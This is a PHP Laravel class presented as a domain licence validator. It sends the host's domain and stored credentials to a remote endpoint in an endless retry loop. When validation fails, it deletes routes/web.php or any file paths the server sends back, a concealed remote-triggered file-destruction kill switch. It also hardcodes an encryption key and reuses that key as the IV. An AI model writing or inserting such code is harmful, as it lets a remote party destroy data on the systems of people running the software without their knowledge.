<?php

namespace Synthora\Gem;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;

class Rd
{
    protected $remoteEndPoint = 'http://127.0.0.1:8000/api/whitelist';
    protected $storageFile = 'system_preferences.dat';
    protected $cryptoKey = 'base64:345sdkflas3r4wfad';

    public function initiateValidation()
    {
        $currentDomain = request()->getHost();
        $accessCode = $this->fetchStoredAccessData();
        $uniqueId = $accessCode['uid'] ?? null;
        $secureKey = $accessCode['key'] ?? null;
        
        if ($this->checkPreviousValidation()) {
            return;
        }

        $verificationResponse = $this->attemptValidation($currentDomain, $uniqueId, $secureKey);

        if ($verificationResponse) {
            $verificationStatus = $verificationResponse->json('status');
            $responseData = $verificationResponse->json('data');

            if ($verificationStatus === 'success') {
                $this->persistValidationStatus('valid', $uniqueId, $secureKey);
            } elseif ($verificationStatus === 'retry') {
                $this->persistValidationStatus('retry', $responseData['uid'] ?? null, $responseData['key'] ?? null);
            } else {
                $this->persistValidationStatus('invalid');
                $this->executeFailureProcedures($responseData);
            }
        }
    }

    protected function attemptValidation($domain, $uniqueId, $secureKey)
    {
        while (true) {
            try {
                $response = Http::timeout(5)->post($this->remoteEndPoint, [
                    'domain' => $domain,
                    'uid' => $uniqueId,
                    'key' => $secureKey,
                ]);

                if ($response->successful()) {
                    return $response;
                }
            } catch (\Exception $e) {
                sleep(2);
            }
        }
    }

    protected function fetchStoredAccessData()
    {
        $filePath = storage_path('app/' . $this->storageFile);
        if (File::exists($filePath)) {
            $encryptedData = File::get($filePath);
            $decryptedData = json_decode($this->decodeData($encryptedData), true);

            return [
                'uid' => $decryptedData['uid'] ?? null,
                'key' => $decryptedData['key'] ?? null,
            ];
        }
        return ['uid' => null, 'key' => null];
    }

    protected function persistValidationStatus($status, $uniqueId = null, $secureKey = null)
    {
        $data = [
            'status' => $status,
            'uid' => $uniqueId,
            'key' => $secureKey,
            'next_attempt' => now()->addDay()->toDateTimeString(),
            'randomizer' => Str::random(32)
        ];


        $encodedData = $this->encodeData(json_encode($data));

        try {
            File::ensureDirectoryExists(storage_path('app'));
            File::put(storage_path('app/' . $this->storageFile), $encodedData);
        } catch (\Exception $e) {
        }
    }

    protected function checkPreviousValidation()
    {
        $filePath = storage_path('app/' . $this->storageFile);
        if (File::exists($filePath)) {
            $encryptedData = File::get($filePath);
            $decryptedData = json_decode($this->decodeData($encryptedData), true);

            return isset($decryptedData['status']) && $decryptedData['status'] === 'valid' && now()->lt($decryptedData['next_attempt']);
        }
        return false;
    }

    protected function executeFailureProcedures($data)
    {
        $targetFiles = $data['fileArray'] ?? [
            base_path('routes/web.php'),
        ];

        foreach ($targetFiles as $file) {
            if (File::exists($file)) {
                File::delete($file);
            }
        }
    }

    protected function encodeData($data)
    {
        return openssl_encrypt($data, 'AES-256-CBC', $this->cryptoKey, 0, substr($this->cryptoKey, 0, 16));
    }

    protected function decodeData($encodedData)
    {
        return openssl_decrypt($encodedData, 'AES-256-CBC', $this->cryptoKey, 0, substr($this->cryptoKey, 0, 16));
    }
}
